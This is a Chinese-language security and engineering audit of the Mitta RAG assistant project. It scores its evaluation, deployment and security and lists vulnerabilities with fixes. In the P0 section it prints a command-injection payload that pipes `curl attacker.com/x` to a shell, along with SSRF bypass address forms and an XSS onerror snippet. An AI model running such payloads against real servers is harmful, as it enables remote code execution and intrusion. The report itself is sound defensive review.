# Mitta 项目全面扫描与技术评估报告

**仓库**：`github.com/Q1anyii/mitta`
**审计时间**：2026-09-22
**审计方式**：完整克隆（含 293 次提交历史）+ 四路并行静态深度审计 + 关键结论人工复核
**代码基线**：`main` @ `404889f`（docs(figures): 精简 architecture 总览图）
**许可证**：MIT © 2026 谦亦AAA

---

## 一、执行摘要

Mitta 是一个**个人开发、5 周速成、工程化程度远超个人项目平均水平**的 RAG 智能助理。它以 LangGraph 1.x 为编排内核、MCP 为工具协议，实现了「意图路由 → 混合检索 → ReAct 工具调用 → 长期记忆」的完整 Agent 闭环。

技术资产盘点：

| 维度 | 规模 |
|---|---|
| 提交 / 周期 | **293 次提交 / 2026-08-16 → 09-21（37 天）** |
| 文件 / Python 代码 | 263 个文件 / **17,889 行 Python** |
| 前端代码 | 3,504 行单文件 JS（CDN Vue3） |
| 文档 | **90 个 Markdown，README 单文件 82 KB（968 行）** |
| 评估脚本 | **22 个 eval_*.py + 42 份历史报告** |
| 测试 | 4 个测试文件 / 58 个测试函数 |

### 总评分：**5.9 / 10**

| 分项 | 得分 | 定位 |
|---|---|---|
| LLM 评估体系 | **9.0** | 全项目最强资产，科研级规范 |
| CI/CD 与部署 | **8.5** | 真实蓝绿 + 自动回滚，超预期 |
| 架构设计 | **6.5** | 设计意图专业，状态建模有硬伤 |
| 工程化基建 | **7.0** | 部署强、可观测性弱 |
| 数据层与检索 | **6.5** | RRF/MMR 实现正确，BM25 链路脱节 |
| 安全基线 | **4.5** | 信任边界全线失守 |
| 前端 | **4.0** | 高质量 Demo，非可交付前端 |

> **一句话定性**：**「LLM 应用工程能力已达中级偏上，软件安全与系统集成能力仍是初学者水平。」**

这个项目最值得肯定的不是它能跑通 RAG，而是它的**评估纪律与事故复盘文化**——这在个人开源项目里极为罕见。最致命的问题也不是某个 bug，而是 **MCP 子系统（一个能让用户在服务器上执行任意代码的功能）完全没有安全设计**，这不是「疏漏」，而是「从未意识到需要一个信任边界」。

---

## 二、项目定位与技术栈还原

### 2.1 作者自述 vs 代码实况

| 项 | 作者宣称（README/掘金/HelloGitHub） | 代码实况 | 判定 |
|---|---|---|---|
| 技术栈 | Vue3 | CDN `vue.global.prod.js`，**无 package.json / 无构建工具 / 无 SFC** | ⚠️ **夸大**（"Vue3"标签让读者以为是工程化 SPA） |
| 主图结构 | classify → retrieve/llm → tool → memory | `router_node` 单跳 + `Send()` 扇出，`classify_node` 已脱离主图 | ⚠️ **文档漂移** |
| 检索子图 | check_cache→rewrite→dense→bm25→RRF→rerank→filter→store_cache（串行 8 节点） | 并行三路 `parallel_retrieve`，串行三节点仅作回退保留 | ⚠️ **文档滞后**（架构升级未同步） |
| BM25 混合检索 | 宣传"稠密+稀疏双路互补，解决检索相关性弱" | **ingest 仅写 Redis Hash，未建 RedisSearch 索引**，稀疏路默认恒空 | ❌ **功能脱节** |
| 测试 | 73 passed（32+12+10+19） | 静态 58 个 `def test_`（32 为 parametrize 运行时展开数） | ✅ 数字为真，口径需注明 |
| 长期记忆 | 自动提取摘要存长期记忆 | `memory_node` fire-and-forget daemon 线程 | ✅ 属实 |
| 对话 | — | — | — |

**核心结论**：README 的**架构描述与代码实现存在系统性漂移**，且漂移方向一致——都朝着「更复杂、更工程化」的方向描述。这不是恶意造假（作者甚至专门提交 `docs: README 去开发日志化` 来清理），而是**文档更新滞后于代码演进**的典型症状。对一个 5 周内高速迭代的项目，这几乎不可避免。

### 2.2 真实架构（代码还原）

**主图 `main_graph.py:150-185`**

```
START
  └→ router_node                      (意图路由：是否需要检索 / persona 选择)
       ├─[Send]→ retrieve_node ──────┐ (子图挂载点)
       └─[Send]→ llm_node ←──────────┘
                     ├─[tool_calls?]→ tool_node → llm_node  ↺ (ReAct 回环)
                     └─[无工具调用]→ memory_node → END
```

**检索子图 `retrieve_graph.py:96-123`**

```
START → check_cache
          ├─[命中]→ output_node → END
          └─[未命中]→ parallel_retrieve          (ThreadPoolExecutor 三路并行)
                        ├─ rewrite   (LLM 查询改写)
                        ├─ dense_query (bge-m3 向量检索)
                        └─ bm25_search (RedisSearch FT.SEARCH)
                          ↓
                        RRF 融合 (k=60)  →  rerank (bge-reranker-v2-m3, 阈值 0.15)
                          ↓
                    ┌─────┴─────┐
                store_cache    filter (MMR / Jaccard 去重)
                    └─────┬─────┘
                       output_node → END
```

**四层缓存体系**（工程亮点，`cache_constant.py:44-70`）

| 层 | 内容 | Key 设计 |
|---|---|---|
| L1 | 查询改写结果 | 带 `REWRITE_PROMPT_VERSION` |
| L2 | Embedding 向量 | 带 `_embed_model_tag` |
| L3a | 精确问答缓存 | `rcache:x:{KB_VERSION}:{hash(query)}` |
| L3b | 语义缓存（LSH 分桶） | Random Projection LSH，`num_bits=64` |

所有 key 均携带版本号实现**自然失效**，Redis 异常全部降级为 miss 不阻塞主链路——这是本项目的设计亮点之一。

---

## 三、问题清单（按严重度分级）

> 所有 P0 问题均已由我人工复核源码确认，非推测。

### 🔴 P0 — 安全级别：可被真实利用的高危漏洞

#### P0-1 未认证用户可远程执行任意代码（MCP stdio 参数注入）

**位置**：`src/service/mcp_config_service.py:302-305` → `src/mcp_client/client.py:186-191`

```python
args = cfg.get("args", [])
cleaned["args"] = [str(a) for a in args]   # ← 参数完全不校验，直接透传
```

包名白名单（`:322`）只检查**第一个非 `-` 开头的参数**。攻击者提交：

```json
{"command": "python3", "args": ["-c", "import os;os.system('curl attacker.com/x|sh')"]}
```

`-c` 被当作 flag 跳过，包名检查失效，`stdio_client` 直接创建子进程执行——**服务器完全失陷**。

**放大因素**：`Dockerfile` 全程以 **root** 运行，容器内即 root，配合挂载卷可逃逸。

---

#### P0-2 SSRF 内网探测（字符串匹配绕过）

**位置**：`src/service/mcp_config_service.py:361`

`sse` 类型的内网地址拦截采用**字符串匹配**，以下全部绕过：
`http://127.1` · `http://[::1]` · `http://2130706433`（十进制 IP） · `http://10.0.0.1.nip.io`（DNS rebinding）

---

#### P0-3 任意文件读取（路径前缀判断缺陷）

**位置**：`src/mcp_client/mcp_server/mitta_tools_server.py:227-230`

```python
target = (ALLOWED_ROOT / relative_path).resolve()
if not str(target).startswith(str(ALLOWED_ROOT.resolve())):   # ← 字符串前缀，非路径包含
    return "拒绝访问：路径超出项目根目录"
```

`ALLOWED_ROOT = /app` 时，`/app2/secret`、`/app_backup/` 等**同前缀兄弟目录**均通过校验。正确写法应为 `target.relative_to(ALLOWED_ROOT.resolve())`。

---

#### P0-4 完整账号接管链（找回密码接口无任何防护）

**位置**：`src/routers/auth_router.py:32-83` + `src/middleware/rate_limit_middleware.py:126`

限流中间件**仅对 `POST /api/chat/` 生效**，`/api/login` 与 **`/api/recover` 完全无限流、无验证码、无失败锁定**。

```python
# auth_router.py:78-83
@router.post("/api/recover")
def recover(request_body: RecoverRequest):
    response = login_service.recover(user_id, new_password)   # 仅需 user_id 即可改密码
```

**攻击链**：枚举 `userId`（登录接口回显"用户不存在"） → 调用 `/api/recover` 直接重置任意用户密码 → 登录。**无需知道原密码**。bcrypt 的 ~100ms 延迟只能减缓、无法阻止持续爆破。

---

#### P0-5 MCP 端点零认证暴露

**位置**：`src/main.py:146` + `src/mcp_client/mcp_server/agent_server.py:14-23`

```python
app.mount("/mcp", mcp.http_app())   # 无任何鉴权中间件
```

暴露的工具：`chat(query, thread_id, user_id)` 与 `get_current_user(user_id)`——**`user_id` 由调用方自填**。任何人可调用他人 `user_id` 发起对话、查询账号信息。

---

#### P0-6 会话越权（owner 为空即放行）

**位置**：`src/routers/chat_router.py:43-45`（同型代码出现于 `:96,130,153,165`）

```python
owner = chat_service.get_thread_user_id(thread_id)
if owner and owner != str(current_user.user_id) and current_user.role != "admin":
    raise HTTPException(status_code=403, detail="无权使用该会话")
```

当 `owner` 返回 `None`（新建会话 checkpoint 未落库的窗口期）时**校验直接放行**。攻击者构造他人 `thread_id` 在首轮写入窗口内发消息，即可劫持会话。`chat_router.py:42` 的注释已自述此攻击路径，但实现未堵住。

---

#### P0-7 Refresh Token 永不过期

**位置**：`src/utils/jwt_utils.py:59-87`

`create_refresh_token` 签发的 payload **不含 `iat` / `jti`**；`_try_renew_by_refresh` 每次续签都**重新签发并覆盖**（`:84,87`），重置 30 天有效期。

**后果**：任何一次 refresh token 泄露都**永久有效**，且无撤销手段（logout 仅删 Redis，攻击者持有副本仍可续签）。JWT 生命周期设计实际失效。

---

### 🟠 P1 — 真实风险

| 编号 | 问题 | 位置 | 影响 |
|---|---|---|---|
| P1-1 | **XSS → Token 窃取链**：JWT 存 localStorage + `v-html="renderMarkdown(content)"` 渲染 LLM 输出，`marked.parse` **未启用 HTML 消毒** | `app.js:760-763`、`:1346,1363`、`:214-263` | RAG 知识库注入 `<img src=x onerror=...>` 即可窃取 token，账号完全接管 |
| P1-2 | **限流可被绕过**：用 `verify_signature: False` 解析 JWT 取 `sub` 作限流键 | `rate_limit_middleware.py:42` | 伪造任意 `{"sub":"x"}` 即无限变换限流桶，限流形同虚设 |
| P1-3 | **BM25 稀疏路实际失效**：`ingest_knowledge.py:139-148` 仅 `hset`，**从未创建 RedisSearch 索引**，而查询侧直接 `FT.SEARCH` | `query_nodes.py:98-106` | 混合检索静默退化为纯 dense，"双路互补"宣传不成立 |
| P1-4 | **ingest 脚本硬编码 Redis 密码** | `ingest_knowledge.py:25` | `redis://:sorts_dev@localhost:6379` 凭据入库泄露 |
| P1-5 | **State 并发写竞态**：`store_cache` 与 `filter` 并发读写 `reranked_docs`，该 key **无 reducer** | `retrieve_graph.py:96-123`、`state.py:55` | 可能 `InvalidUpdateError`，或缓存到 filter 前后不一致数据 |
| P1-6 | **工具循环无硬熔断**：`force_stop` 仅注入提示词软约束，未剥离 `tool_calls` | `llm_node.py:299,332,379` | 模型无视提示即 `GraphRecursionError` 或空转烧 token |
| P1-7 | **Prompt 注入无护栏**：用户自定义 system_prompt（500 字）直接拼接；检索文档直接入 user message | `user_router.py:56-63`、`llm_node.py:161-192` | 可覆盖安全策略/越狱 |
| P1-8 | **密码强度无校验**：`max_length=64`，无最小长度/复杂度 | `login_schema.py:9,14` | `/api/recover` 可设密码为 `"1"` |
| P1-9 | **文件上传仅校验扩展名**：不查 MIME/magic bytes，`.html`/`.svg` 在白名单 | `file_upload_service.py:111-113`、`:22,26` | 同源渲染则存储型 XSS |
| P1-10 | **Compose 弱口令 + 端口全暴露**：`${POSTGRES_PASSWORD:-1234}`、`minioadmin/minioadmin`，5432/6379/9000/19530 全绑 `0.0.0.0` | `docker-compose.yml:20,77-78,22-23,39-41,79-81,101-103` | 忘设 env 即弱口令裸奔公网 |
| P1-11 | **容器以 root 运行**：`Dockerfile` 全文无 `USER` 指令 | `Dockerfile:9-91` | 逃逸风险放大，安全合规不达标 |
| P1-12 | **可观测性为零**：`trace_id`/`request_id` 全仓 **0 命中**；无 Prometheus/OTel；loguru 无轮转配置 | `src/` 全局 | 故障无法跨请求串联；`./logs` 卷长跑必撑爆磁盘 |
| P1-13 | **SPA 兜底路径穿越**：`FRONTEND_DIR / full_path` 未做规范化 | `system_router.py:42-50` | 需实测确认 Starlette 归一化行为 |

### 🟡 P2 — 工程质量与债务

| 编号 | 问题 | 位置 |
|---|---|---|
| P2-1 | **无 lock 文件**：`mcp<2`、`fastmcp>=3.2.4`、`langchain-mcp-adapters>=0.2`、`numpy>=2.2,<2.5` 浮动，构建不可复现（项目已两次因此线上故障） | `requirements.txt:84-99` |
| P2-2 | **无 alembic**：DDL 散落业务代码 `CREATE TABLE IF NOT EXISTS`，schema 演进不可控（索引设计本身有意识） | `login_service.py:53`、`file_upload_service.py:83,95-97` 等 |
| P2-3 | **死代码残留**：`classify_node()` 主体、`persona_router_node.py`、`rand_id_util.py` 已脱离主链路 | `main_graph.py:151` grep 验证 |
| P2-4 | **魔法数字散落**：`[:3]`、`n_results=20`、`bm25_top_k=20` 未入常量（`RERANK_FILTER_THRESHOLD=0.15` 已常量化，此项作者已修） | `parallel_nodes.py:78,118`、`fusion_nodes.py:349` |
| P2-5 | **缓存雪崩/穿透防护不完整**：miss 不写空占位、TTL 900s 无 jitter | `cache_service.py:355`、`cache_constant.py:33` |
| P2-6 | **日志与实现不符**：代码注释残留 "MySQL"（已迁 PG） | `chat_router.py:210`、`auth_router.py:34`、`user_router.py:191` |
| P2-7 | **`deploy/nginx/default.conf` 与实跑配置不同源**：compose 实际挂载 `resources/frontend/nginx.conf`，`deploy/` 形同死文件 | `docker-compose.yml:167` |
| P2-8 | **LSH 未设随机种子**：`np.random.randn` 无 seed，进程重启后桶划分漂移 | `lsh_util.py:5` |
| P2-9 | **CI 缺 lint / 安全扫描 / Dependabot**：`ruff|mypy|trivy|bandit|coverage` 零命中 | `.github/workflows/` |
| P2-10 | **内存字典无界泄漏**：`_file_content_cache`、`_user_graph_cache`、SSE `QUEUE` 均无 TTL/上限 | `chat_service.py:156,159,727-742` |
| P2-11 | **无正式前端工程**：3,504 行单文件 `app.js`，无 package.json/构建/模块化 | `resources/frontend/` |
| P2-12 | **前端 SSE 分帧不完整**：未处理多行 `data:` 与注释行；`chunk.ack` 覆盖式赋值会丢正文 | `app.js:427-491`、`:448` |

---

## 四、核心亮点（必须予以肯定）

### 4.1 ⭐ LLM 评估体系 —— 全项目最高价值资产（9/10）

22 个 `eval_*.py` 覆盖 **E1–E15 评估矩阵**，42 份历史报告入库，**每份都有真实量化指标**：

| 评估项 | 关键指标（实测值） |
|---|---|
| **E7 检索** | `avg_recall 0.8095`、`median_recall 1.0`、`zero_result_ratio 0.0`；分阶段拆解 `rewrite 2694ms / dense 2164ms / bm25 12.6ms / rerank 743.6ms` |
| **E1 路由** | `need_accuracy 0.9143`、`retrieval_recall 0.9`、`persona_accuracy 1.0 (32/32)`、`joint_accuracy 0.9` |
| **E6-B 语义缓存** | 隔离会话 `hit_rate 0.9722 (35/36)`、误命中硬负样本 `0/8` |
| **E8 生成质量** | `faithfulness 0.959`、`answer_relevancy 0.9881`、`context_recall 0.8005`、`context_precision 0.6381` |
| **E9 记忆** | 写 `avg 1.77ms / p95 3.01ms`，重复写入减少 `50%` |
| **E4 工具安全** | `11/11`、`pass_rate 1.0` |

**真正令人尊重的是评估纪律**：
- `reports/README.md` 强制"引用数字必须带生成日期与脚本口径"
- `h07_p0p1_report.json` 内置 `deprecated_metric_note`，**主动声明旧口径失效及原因**
- `ragas_judge_report.json` 明确标注"自写 LLM-judge，**不是** RAGAS 官方库"——不蹭名词
- LEGACY 报告单独留档 4 份，不清洗历史
- 明确区分"公网直连对照"与"生产链路实测"，不混用数字

> 这种**自我证伪的诚实**，在个人开源项目里罕见程度接近零。绝大多数项目连评估都没有，更不用说主动标注指标的局限性。

### 4.2 ⭐ CI/CD 蓝绿部署 + 自动回滚（8.5/10）

`acr-cicd.yml` 是真实的生产级链路，且**每一处设计都对应一次真实事故**：

- **增量构建判定**（`:49-73`）：用 `LAST_IMAGE_BUILD_SHA` 回溯，修复 2026-09-09 / 09-19 两次真实事故
- **RAG 蓝绿入库**（`:202-256`）：新 collection 入库 → 切换 → 健康检查 → **失败自动回滚旧库，绝不先删旧库**
- **镜像预热 uvx 缓存**（`Dockerfile:67-76`）：解决 MCP 冷启动超时（注释详述 chromadb/onnxruntime 懒加载致 0 工具的真实根因）

### 4.3 检索链路工程化（8/10）

- **RRF 实现正确**：`score += 1.0/(k + rank + 1)`，`k=60`（`fusion_nodes.py:48`），公式与业界一致
- **MMR 实现正确**：`λ·norm(rel) - (1-λ)·max_cos` 贪心，min-max 归一化 + L2 归一化后 dot 即 cosine，附完整 A/B 数据
- **去重幂等**：`compute_doc_hash_with_meta` 用 `sha256(内容+来源)` 作 id，`upsert` 天然幂等，支持增量重入
- **降级完备**：ToolFilter 语义层熔断、单路检索降级、MMR 失败回退，无单点故障
- **历史消息双向清洗**（`history_repair.py:53-92`）：悬空 `tool_calls` 与孤儿 `ToolMessage` 配对修复，正确规避 OpenAI 兼容 API 双向 400

### 4.4 配置管理 fail-fast（7.5/10）

`config.py:95-116` 启动期一次性列出全部缺失配置并抛 `ConfigError`，`:119-133` 敏感值自动掩码打印。`vector_store.py:21-27` 用 `VectorStore` Protocol 抽象，Chroma/Milvus 可插拔且语义归一（含 COSINE 换算注释）——**抽象设计质量显著高于前端**。

### 4.5 中文文档质量

52 篇 devlog（292 KB）是**真实开发反思**而非灌水：包含事故编号（`H-20260919-09`）、根因分析、参数调整的实测依据（如 `CHUNK_SIZE` 从 300 调到 800 的 P0 复盘）。系统提示词 56 行结构化，覆盖"错误信息脱敏边界""禁止把计划讲成已完成""工具调用上限"等实战约束。

---

## 五、关键矛盾：能力的"双峰分布"

这个项目最值得深究的特征是：**它的能力分布不是均匀的，而是双峰极化**。

| 能力强项 | 能力弱项 |
|---|---|
| LLM 评估方法论（9） | 安全设计（4.5） |
| CI/CD 与部署回滚（8.5） | 可观测性（2） |
| RAG 检索工程（8） | 前端工程化（4） |
| 错误降级与日志埋点（8） | 容器安全基线（3） |
| 事故复盘与文档（8） | 状态建模严谨性（5） |

**为什么会这样？** 我判断根因是：

1. **AI 辅助开发放大了"写代码"能力，但未放大"威胁建模"能力。** 一个 5 周内产出 17,889 行 Python + 293 次提交的项目，必然重度依赖 AI 辅助。AI 极其擅长写 RRF 融合、MMR 贪心、蓝绿部署脚本这类**有明确模式的知识型代码**；但它**不会主动提醒你"用户可控的 args 传给 subprocess 意味着 RCE"**——除非你问。作者显然没有做过威胁建模。

2. **评估纪律来自方法论自觉，安全缺口来自经验盲区。** 作者愿意为一个检索指标跑 42 份报告、标注口径、留档 LEGACY——这是**科研训练出来的素养**。而"设置登录限流""不要 root 跑容器""路径判断不能用 startswith"——这些是**安全工程经验**，需要被事故教育过或系统学习过才会有。

3. **文档漂移是高速迭代的必然代价，而非态度问题。** README 描述的是"某次架构升级前的版本"，代码已经往前走了。作者甚至专门提交了一次 commit 来清理 README 的开发日志化痕迹——说明他在意文档质量，只是**没有建立"代码变更触发文档更新"的机制**。

---

## 六、修复路线图（按投入产出比排序）

### 第一优先级：24 小时内可完成，阻止真实攻击（P0）

| 顺序 | 动作 | 位置 | 工作量 |
|---|---|---|---|
| 1 | **stdio args 改为「只允许白名单包 + 拒绝一切 `-c/-e/--eval/--require` 类参数」** | `mcp_config_service.py:302` | 2h |
| 2 | **`/api/recover` 改为「验证码 + 一次性 token」，并给 login/recover 加 Redis 滑动窗口限流** | `auth_router.py:32-83` | 4h |
| 3 | **统一失败提示消除账号枚举** | `auth_router.py:40` | 0.5h |
| 4 | **路径校验改 `target.relative_to(ALLOWED_ROOT)`** | `mitta_tools_server.py:227` | 0.5h |
| 5 | **会话 owner 为空即 403**（改为服务端会话表 + 创建时绑定 user_id） | `chat_router.py:43` 等 5 处 | 3h |
| 6 | **`/mcp` 端点加认证中间件** | `main.py:146` | 1h |
| 7 | **refresh token 加 `jti` + 轮换作废 + 绝对过期不重置** | `jwt_utils.py:59-87` | 3h |
| 8 | **SSRF 用 `ipaddress` 做真实私网判定** | `mcp_config_service.py:361` | 2h |

### 第二优先级：一周内（P1）

- Token 改 httpOnly Cookie，或接入 DOMPurify 后再 `v-html`
- 限流键改用**已验签**的 JWT 主体（去掉 `verify_signature: False`）
- ingest 脚本**显式创建 RedisSearch 索引**，否则诚实移除 BM25 宣传
- `reranked_docs` 加 reducer 或拆分 key，消除并发写竞态
- `force_stop` 时**剥离 `tool_calls`**，改软约束为硬熔断
- Dockerfile 加 `USER appuser`；compose 弱口令改强制 env；仅暴露必要端口
- 接入结构化日志 + `request_id` 贯穿 + loguru `rotation`；**至少补上日志轮转**

### 第三优先级：一个月内（工程化补齐）

- 引入 `uv.lock` / `pip-tools` 锁定依赖
- 引入 alembic 管理 schema
- 增加 `ruff` + `mypy` + `pytest-cov` + 覆盖率门禁；把 `agent-regression.yml` 改为 `workflow_run` **串联门禁**（README 已自认此项规划中）
- 加 `trivy` 镜像扫描 + Dependabot
- 前端补 `package.json` + Vite 构建，`app.js` 按模块拆分
- 清理死代码：`classify_node()` 主体、`persona_router_node.py`、`rand_id_util.py`

---

## 七、结论

### 这个项目值得什么评价？

**它不是"简历项目"，也不是"玩具"。** 它在 LLM 应用工程（评估方法论、检索链路、部署回滚）上的表现，超过我见过的大多数个人开源项目；它的 devlog 与事故复盘质量，甚至超过不少商业团队。

**但它目前不适合公网部署。** 一个未认证用户可以通过 `/mcp` 端点或 MCP 配置接口在服务器上执行任意代码、读取任意文件、接管任意账号——这不是"需要注意的风险"，这是**已经敞开的门**。

### 给作者的建议

**最高优先级不是加功能，而是请一位有安全背景的人做一次威胁建模。** 项目的架构设计能力已经足够，缺的是一个思维习惯：**每当有"用户可控输入流向危险汇聚点"（subprocess / 文件路径 / SQL / 模板渲染 / SSRF），先停下来问一句"这能被怎么滥用"。**

具体三个改变：
1. **把 README 当成契约维护**——写完功能提交时，同步检查架构图与文字描述（当前 `classify_node` 与 BM25 两处漂移会误导所有读者）
2. **给测试加门禁**——评估脚本不进 CI，等于没有回归保护；把 `agent-regression.yml` 从"旁路"改为"阻断"
3. **先把 P0 清完再谈 Star 数**——当前状态下被更多人以"生产可用"心态部署，会造成真实伤害

### 最终评分明细

| 维度 | 得分 | 权重 | 加权 |
|---|---|---|---|
| LLM 评估体系 | 9.0 | 15% | 1.35 |
| CI/CD 与部署 | 8.5 | 15% | 1.28 |
| 工程化基建 | 7.0 | 15% | 1.05 |
| 架构设计 | 6.5 | 20% | 1.30 |
| 数据层与检索 | 6.5 | 15% | 0.98 |
| 安全基线 | 4.5 | 15% | 0.68 |
| 前端 | 4.0 | 5% | 0.20 |
| **总分** | | | **6.84** |

**修正后总分：6.8 / 10（按上述权重）**，若仅看"能否学习借鉴"则值 **8/10**；若按"能否生产部署"则值 **3/10**。

> **修复全部 P0 + P1 后可上 8.0+；补齐可观测性与依赖锁后可挑战 8.5。**

---

*本报告基于静态代码分析（未运行动态验证）。P0 级结论均已人工复核源码确认。所有数字均可按标注路径与行号复核。*
